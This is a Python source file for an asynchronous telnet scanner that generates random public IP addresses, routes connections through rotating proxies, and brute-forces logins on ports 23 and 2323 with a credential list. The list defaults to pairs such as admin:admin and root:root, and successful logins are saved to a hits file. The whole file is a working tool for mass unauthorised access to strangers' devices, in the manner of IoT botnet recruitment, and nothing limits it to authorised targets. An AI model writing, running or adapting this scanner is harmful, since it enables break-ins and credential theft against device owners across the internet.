#!/usr/bin/env python3
"""
Improved Telnet Scanner
An asynchronous network scanner that discovers and attempts to authenticate to telnet services
using credential lists and secure proxying.
"""
import asyncio
import random
import aiofiles
import logging
import argparse
import signal
import sys
import time
from contextlib import suppress
from datetime import datetime

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
    handlers=[
        logging.StreamHandler(sys.stdout)
    ]
)

logger = logging.getLogger("ImprovedTelnetScanner")

# Constants for scanner settings
MAX_CONNS = 50
IP_BATCH_SIZE = 200
CONNECT_TIMEOUT = 5
LOGIN_TIMEOUT = 6
BATCH_DELAY = 1.0

# File paths
PROXY_LIST = "proxies.txt"
CREDS_FILE = "creds.txt"
HITS_FILE = "hits.txt"
PORTS = [23, 2323]

# Global variables for graceful shutdown
running = True
file_lock = asyncio.Lock()
http_proxies = []

# Reserved network prefixes for IP generation
RESERVED_PREFIXES = [
    "0.", "10.", "100.64.", "127.", "169.254.",
    "172.16.", "172.31.", "192.0.0.", "192.168.",
    "198.18.", "198.19.", *[f"{i}." for i in range(224, 256)]
]

# Statistics tracking
class StatTracker:
    def __init__(self):
        self.scanned = 0    # Number of IPs scanned
        self.attempts = 0   # Number of login attempts
        self.hits = 0       # Number of successful logins
        self.start_time = datetime.now()
    
    def elapsed_time(self):
        """Get elapsed time in seconds"""
        return (datetime.now() - self.start_time).total_seconds()
    
    def attempts_per_second(self):
        """Calculate attempts per second"""
        elapsed = self.elapsed_time()
        return self.attempts / elapsed if elapsed > 0 else 0
    
    def hit_ratio(self):
        """Calculate hit ratio"""
        return self.hits / self.attempts if self.attempts > 0 else 0

# IP Generation functions
def is_reserved(ip):
    """Check if an IP is in a reserved network"""
    return any(ip.startswith(prefix) for prefix in RESERVED_PREFIXES)

def get_random_ip_batch(batch_size):
    """Generate a batch of random IPs avoiding reserved ranges"""
    batch = set()
    while len(batch) < batch_size:
        ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
        if not is_reserved(ip):
            batch.add(ip)
    return list(batch)

# Proxy management functions
async def load_proxies(proxy_file=PROXY_LIST):
    """Load proxies from file or create default"""
    try:
        proxies = []
        if os.path.exists(proxy_file):
            async with aiofiles.open(proxy_file, "r") as f:
                async for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        proxies.append(line)
        
        if not proxies:
            # Default to local WireGuard proxy
            logger.info("No proxies found, using default local proxy")
            return ["127.0.0.1:8888"]
        
        logger.info(f"Loaded {len(proxies)} proxies")
        return proxies
    except Exception as e:
        logger.error(f"Error loading proxies: {e}")
        return ["127.0.0.1:8888"]  # Default local proxy

async def open_http_proxy_tunnel(proxy_ip, proxy_port, target_ip, target_port):
    """Open HTTP proxy tunnel to target"""
    try:
        # Direct connection if proxy is 127.0.0.1:0
        if proxy_ip == "127.0.0.1" and int(proxy_port) == 0:
            try:
                logger.debug(f"Attempting direct connection to {target_ip}:{target_port}")
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(target_ip, target_port),
                    timeout=CONNECT_TIMEOUT
                )
                logger.debug(f"Direct connection succeeded to {target_ip}:{target_port}")
                return reader, writer
            except asyncio.TimeoutError:
                logger.debug(f"Direct connection timeout to {target_ip}:{target_port}")
                return None, None
            except Exception as e:
                logger.debug(f"Direct connection failed to {target_ip}:{target_port}: {e}")
                return None, None
                
        # Connect to proxy
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(proxy_ip, int(proxy_port)),
            timeout=CONNECT_TIMEOUT
        )
        
        # Prepare CONNECT request
        connect_req = (
            f"CONNECT {target_ip}:{target_port} HTTP/1.1\r\n"
            f"Host: {target_ip}:{target_port}\r\n"
            "User-Agent: Mozilla/5.0 (compatible)\r\n"
            "Proxy-Connection: Keep-Alive\r\n"
            "\r\n"
        )
        
        # Send request
        writer.write(connect_req.encode())
        await writer.drain()
        
        # Retrieve and check response
        try:
            response = await asyncio.wait_for(
                reader.readuntil(b"\r\n\r\n"), 
                timeout=CONNECT_TIMEOUT
            )
            
            if b"200 Connection established" in response or b"200 OK" in response:
                return reader, writer
            
            logger.debug(f"Proxy tunnel rejected: {response.decode(errors='ignore')}")
            writer.close()
            await writer.wait_closed()
            
        except asyncio.TimeoutError:
            logger.debug(f"Timeout waiting for proxy response")
            writer.close()
            await writer.wait_closed()
            
    except Exception as e:
        logger.debug(f"Proxy tunnel error ({proxy_ip}:{proxy_port}): {e}")
    
    return None, None

async def test_proxy(proxy):
    """Test if a proxy is working"""
    # Direct connection proxy placeholder - always considered working
    if proxy == "127.0.0.1:0":
        logger.info("Direct connection mode is available")
        return True
    
    # Test actual proxy connections
    proxy_ip, proxy_port = proxy.split(":")
    try:
        logger.debug(f"Testing proxy connection {proxy_ip}:{proxy_port}")
        # Test connection to a reliable host
        reader, writer = await open_http_proxy_tunnel(proxy_ip, proxy_port, "example.com", 80)
        if reader and writer:
            writer.close()
            await writer.wait_closed()
            logger.info(f"Proxy {proxy} is working")
            return True
        else:
            logger.debug(f"Proxy {proxy} failed to connect")
    except Exception as e:
        logger.debug(f"Proxy test failed for {proxy}: {e}")
    
    return False

# Authentication functions
async def load_credentials(creds_file=CREDS_FILE):
    """Load credentials from file"""
    creds = []
    try:
        async with aiofiles.open(creds_file, "r") as f:
            async for line in f:
                line = line.strip()
                if ":" in line and not line.startswith("#"):
                    username, password = line.split(":", 1)
                    creds.append((username, password))
        
        if not creds:
            # Default credentials if file is empty
            logger.warning(f"No valid credentials found in {creds_file}, using defaults")
            creds = [("admin", "admin"), ("root", "root"), ("user", "user")]
        
        logger.info(f"Loaded {len(creds)} credential pairs")
        return creds
    except Exception as e:
        logger.error(f"Failed to load credentials: {e}")
        # Return default credentials
        return [("admin", "admin"), ("root", "root"), ("user", "user")]

async def save_success(ip, port, username, password, hits_file=HITS_FILE):
    """Save successful login to hits file"""
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    async with file_lock:
        try:
            async with aiofiles.open(hits_file, "a") as f:
                await f.write(f"{timestamp} | {ip}:{port} | {username}:{password}\n")
            logger.debug(f"Saved successful hit: {ip}:{port} {username}:{password}")
            return True
        except Exception as e:
            logger.error(f"Failed to save hit: {e}")
            return False

async def attempt_login(ip, port, username, password, stats, attempt=1, max_attempts=3):
    """Attempt to login to a telnet service"""
    # Always include the direct connection option (127.0.0.1:0) to ensure fallback
    available_proxies = http_proxies.copy()
    if "127.0.0.1:0" not in available_proxies:
        available_proxies.append("127.0.0.1:0")
    
    # Try with multiple proxies
    for proxy in random.sample(available_proxies, min(len(available_proxies), 3)):
        proxy_ip, proxy_port = proxy.split(":")
        
        reader = writer = None
        try:
            # Update statistics
            stats.attempts += 1
            
            # Get connection via proxy or direct
            reader, writer = await open_http_proxy_tunnel(
                proxy_ip, int(proxy_port), ip, port
            )
            
            if not reader or not writer:
                continue
            
            # Send username
            writer.write((username + "\r\n").encode())
            await writer.drain()
            await asyncio.sleep(0.2)
            
            # Send password
            writer.write((password + "\r\n").encode())
            await writer.drain()
            
            # Wait for response with timeout
            try:
                data = await asyncio.wait_for(reader.read(512), timeout=LOGIN_TIMEOUT)
                
                # Success indicators for login
                LOGIN_SUCCESS_INDICATORS = [
                    b"$", b"#", b">", b"Welcome", b"root@", b"admin@", b"shell",
                    b"successful", b"logged in", b"BusyBox", b"command"
                ]
                # Failure indicators for login
                LOGIN_FAILURE_INDICATORS = [
                    b"incorrect", b"failed", b"invalid", b"wrong", b"failure", 
                    b"denied", b"bad", b"error", b"login:", b"password:", 
                    b"unauthorized", b"try again"
                ]
                
                # Check for success
                if any(p in data.lower() for p in LOGIN_SUCCESS_INDICATORS) and not any(p in data.lower() for p in LOGIN_FAILURE_INDICATORS):
                    logger.info(f"[SUCCESS] {ip}:{port} -> {username}:{password}")
                    await save_success(ip, port, username, password)
                    stats.hits += 1
                    return True
                
                logger.debug(f"Login failed for {ip}:{port} with {username}:{password}")
                
            except asyncio.TimeoutError:
                logger.debug(f"Login timeout for {ip}:{port}")
                
        except Exception as e:
            # Retry with a different proxy if we have attempts left
            if attempt < max_attempts:
                logger.debug(f"Login attempt error, retrying: {e}")
                return await attempt_login(ip, port, username, password, stats, attempt+1)
            logger.debug(f"Login attempt failed after {attempt} tries: {e}")
            
        finally:
            # Clean up connection
            if writer:
                try:
                    writer.close()
                    await writer.wait_closed()
                except:
                    pass
        
    return False

async def try_all_creds_for_target(ip, port, credentials, semaphore, stats):
    """Try all credentials for a specific IP:port target"""
    async with semaphore:
        logger.debug(f"Scanning {ip}:{port}")
        stats.scanned += 1
        
        tasks = []
        MAX_CONCURRENT_LOGINS = 5  # Limit concurrent login attempts per target
        login_semaphore = asyncio.Semaphore(MAX_CONCURRENT_LOGINS)
        
        for username, password in credentials:
            async def try_cred(u, p):
                async with login_semaphore:
                    return await attempt_login(ip, port, u, p, stats)
            
            task = asyncio.create_task(try_cred(username, password))
            tasks.append(task)
            
            # Process in small batches to avoid overwhelming the target
            if len(tasks) >= MAX_CONCURRENT_LOGINS:
                for completed_task in asyncio.as_completed(tasks):
                    try:
                        if await completed_task:  # Login successful
                            # Cancel remaining tasks
                            for pending in tasks:
                                if not pending.done():
                                    pending.cancel()
                                    with suppress(asyncio.CancelledError):
                                        await pending
                            return True
                    except asyncio.CancelledError:
                        pass
                    except Exception as e:
                        logger.error(f"Error in credential testing: {e}")
                tasks.clear()
        
        # Process remaining tasks
        if tasks:
            for completed_task in asyncio.as_completed(tasks):
                try:
                    if await completed_task:  # Login successful
                        # Cancel remaining tasks
                        for pending in tasks:
                            if not pending.done():
                                pending.cancel()
                                with suppress(asyncio.CancelledError):
                                    await pending
                        return True
                except asyncio.CancelledError:
                    pass
                except Exception as e:
                    logger.error(f"Error in credential testing: {e}")
        
        logger.debug(f"No successful login for {ip}:{port}")
        return False

async def process_batch(ip_batch, credentials, stats):
    """Process a batch of IP addresses"""
    semaphore = asyncio.Semaphore(MAX_CONNS)
    batch_tasks = []
    
    for ip in ip_batch:
        if not running:
            break
            
        for port in PORTS:
            task = asyncio.create_task(
                try_all_creds_for_target(ip, port, credentials, semaphore, stats)
            )
            batch_tasks.append(task)
    
    # Wait for all tasks to complete
    if batch_tasks:
        await asyncio.gather(*batch_tasks, return_exceptions=True)

def print_banner():
    """Print the application banner"""
    banner = """
    ╔════════════════════════════════════════════════════════════╗
    ║                                                            ║
    ║            IMPROVED TELNET SCANNER & AUTHENTICATOR         ║
    ║                                                            ║
    ║  Asynchronous network scanner for telnet services          ║
    ║  Scans random IPs and attempts authentication              ║
    ║                                                            ║
    ╚════════════════════════════════════════════════════════════╝
    """
    print(banner)

async def main():
    """Main execution function"""
    global http_proxies, running
    
    # Parse command line arguments
    parser = argparse.ArgumentParser(description="Improved Asynchronous Telnet Scanner")
    parser.add_argument("-b", "--batch-size", type=int, default=IP_BATCH_SIZE, help="IP batch size for scanning")
    parser.add_argument("-c", "--max-conns", type=int, default=MAX_CONNS, help="Maximum concurrent connections")
    parser.add_argument("--creds", default=CREDS_FILE, help="Path to credentials file")
    parser.add_argument("--hits", default=HITS_FILE, help="Path to save successful hits")
    parser.add_argument("--proxies", default=PROXY_LIST, help="Path to proxy list file")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose logging")
    args = parser.parse_args()
    
    # Set logging level based on verbosity
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Print banner and start message
    print_banner()
    logger.info(f"Started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    
    # Initialize statistics
    stats = StatTracker()
    
    # Initialize components
    http_proxies = await load_proxies(args.proxies)
    credentials = await load_credentials(args.creds)
    
    # Testing proxies
    logger.info(f"Testing {len(http_proxies)} proxies...")
    working_proxies = []
    for proxy in http_proxies:
        if await test_proxy(proxy):
            working_proxies.append(proxy)
    
    # Always add direct connection option regardless of proxy availability
    # This ensures the scanner will work even if no external proxies are available
    if "127.0.0.1:0" not in working_proxies:
        working_proxies.append("127.0.0.1:0")  # Add direct connection
    
    http_proxies = working_proxies
    logger.info(f"Using {len(http_proxies)} working proxies (including direct connection)")
    
    # Setup signal handlers for graceful shutdown
    def handle_shutdown(sig, frame):
        global running
        logger.warning(f"Received signal {sig}. Shutting down gracefully...")
        running = False
    
    signal.signal(signal.SIGINT, handle_shutdown)
    signal.signal(signal.SIGTERM, handle_shutdown)
    
    # Main scan loop
    batch_count = 0
    try:
        while running:
            batch_count += 1
            # Generate random IP batch
            ip_batch = get_random_ip_batch(args.batch_size)
            
            logger.info(f"Batch #{batch_count}: Scanning {len(ip_batch)} IPs across {len(PORTS)} ports...")
            
            # Process the batch
            await process_batch(ip_batch, credentials, stats)
            
            # Print statistics
            elapsed = stats.elapsed_time()
            ips_per_second = (batch_count * args.batch_size) / elapsed if elapsed > 0 else 0
            
            logger.info(f"Statistics - Scanned: {stats.scanned} | "
                       f"Attempts: {stats.attempts} | Hits: {stats.hits} | "
                       f"Speed: {ips_per_second:.2f} IPs/sec")
            
            # Small pause between batches
            await asyncio.sleep(BATCH_DELAY)
            
    except asyncio.CancelledError:
        logger.info("Main task cancelled")
    except Exception as e:
        logger.exception(f"Unexpected error: {e}")
    finally:
        # Print final statistics
        elapsed = stats.elapsed_time()
        logger.info(f"\nScan completed in {elapsed:.2f} seconds")
        logger.info(f"Total statistics - Batches: {batch_count} | "
                   f"Scanned: {stats.scanned} | Attempts: {stats.attempts} | "
                   f"Hits: {stats.hits}")
        logger.info(f"Successful hits saved to: {args.hits}")

if __name__ == "__main__":
    import os  # Import at the top next time
    asyncio.run(main())